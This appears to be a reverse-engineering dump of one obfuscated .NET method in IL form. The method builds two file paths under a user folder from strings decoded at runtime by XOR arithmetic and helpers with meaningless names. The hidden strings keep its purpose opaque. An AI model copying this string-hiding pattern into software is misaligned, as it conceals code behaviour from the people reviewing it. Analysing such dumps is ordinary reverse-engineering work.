# token=060028C0 rva=205288 name=DirectEngine source=dump_full grp=gfp
# vault: fat0=104 maxstack=00093013 locals=9 ticket=c184c61c chunk=01000a13 blocks=1
# {'ilsize': 232, 'maxstack': 9, 'eh': 0}
  IL_0000  ldc.i4.s 0x28
  IL_0002  call 0xa000159   ; MemberRef:System.Environment::GetFolderPath
  IL_0007  stloc.s 0x1
  IL_0009  br IL_000e
  IL_000E  ldc.i4.2
  IL_000F  newarr 0x100000a   ; TypeRef:System.String
  IL_0014  dup
  IL_0015  ldc.i4.0
  IL_0016  ldloc.s 0x1
  IL_0018  ldc.i4 0xeea161c3
  IL_001D  ldc.i4 0xb92e0276
  IL_0022  xor
  IL_0023  ldsfld 0x40020b8   ; Field:20B8
  IL_0028  ldfld 0x40020ba   ; Field:20BA
  IL_002D  xor
  IL_002E  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_0033  ldc.i4 0xdd297c7f
  IL_0038  ldc.i4 0x1b93bfb3
  IL_003D  add
  IL_003E  ldc.i4 0xe5c209c8
  IL_0043  xor
  IL_0044  ldsfld 0x40020b8   ; Field:20B8
  IL_0049  ldfld 0x40020f1   ; Field:20F1
  IL_004E  xor
  IL_004F  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_0054  ldc.i4 0xe57465e0
  IL_0059  ldc.i4 0x2
  IL_005E  shl
  IL_005F  ldc.i4 0xa339ab2a
  IL_0064  xor
  IL_0065  ldsfld 0x40020b8   ; Field:20B8
  IL_006A  ldfld 0x40020fa   ; Field:20FA
  IL_006F  xor
  IL_0070  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_0075  ldsfld 0x4002785   ; Field:2785
  IL_007A  call 0x6005fac   ; MethodDef:ExecuteExplorer
  IL_007F  stelem.ref
  IL_0080  dup
  IL_0081  ldc.i4.1
  IL_0082  ldloc.s 0x1
  IL_0084  ldc.i4 0x6b40840e
  IL_0089  ldc.i4 0x63e4f3d
  IL_008E  xor
  IL_008F  ldsfld 0x40020b8   ; Field:20B8
  IL_0094  ldfld 0x40020a8   ; Field:20A8
  IL_0099  xor
  IL_009A  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_009F  ldc.i4 0x85312d3f
  IL_00A4  ldc.i4 0x89adb380
  IL_00A9  add
  IL_00AA  ldc.i4 0x3bc7886
  IL_00AF  xor
  IL_00B0  ldsfld 0x40020b8   ; Field:20B8
  IL_00B5  ldfld 0x40020a5   ; Field:20A5
  IL_00BA  xor
  IL_00BB  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_00C0  ldc.i4 0x787f73ef
  IL_00C5  not
  IL_00C6  ldc.i4 0x8e539edf
  IL_00CB  xor
  IL_00CC  ldsfld 0x40020b8   ; Field:20B8
  IL_00D1  ldfld 0x40020ad   ; Field:20AD
  IL_00D6  xor
  IL_00D7  call 0x6004196   ; MethodDef:InstantiateTransferableProgram
  IL_00DC  ldsfld 0x4002785   ; Field:2785
  IL_00E1  call 0x6005fac   ; MethodDef:ExecuteExplorer
  IL_00E6  stelem.ref
  IL_00E7  ret
